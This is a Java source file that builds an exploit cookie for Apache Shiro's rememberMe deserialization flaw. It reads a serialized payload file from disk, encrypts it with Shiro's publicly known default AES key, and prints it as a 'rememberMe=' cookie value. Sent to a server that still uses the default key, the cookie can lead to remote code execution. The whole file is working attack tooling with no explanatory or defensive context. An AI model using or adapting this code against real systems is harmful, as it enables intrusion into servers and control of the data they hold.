package org.example.shiroCheck;
import com.sun.org.apache.xerces.internal.impl.dv.util.Base64;
import org.apache.shiro.crypto.AesCipherService;
import org.apache.shiro.util.ByteSource;
import java.io.*;


public class AESencode {
    public static void main(String[] args) throws Exception {
        String path = "D:\\E\\IDEA\\project\\jdk7cc\\result.ser";
        byte[] key = Base64.decode("kPH+bIxk5D2deZiIxcaaaA==");
        AesCipherService aes = new AesCipherService();
        ByteSource ciphertext = aes.encrypt(getBytes(path), key);
        System.out.printf("rememberMe="+ciphertext.toString());
    }


    public static byte[] getBytes(String path) throws Exception {
        InputStream inputStream = new FileInputStream(path);
        ByteArrayOutputStream byteArrayOutputStream = new ByteArrayOutputStream();
        int n = 0;
        while ((n = inputStream.read()) != -1) {
            byteArrayOutputStream.write(n);
        }
        byte[] bytes = byteArrayOutputStream.toByteArray();
        return bytes;
    }
}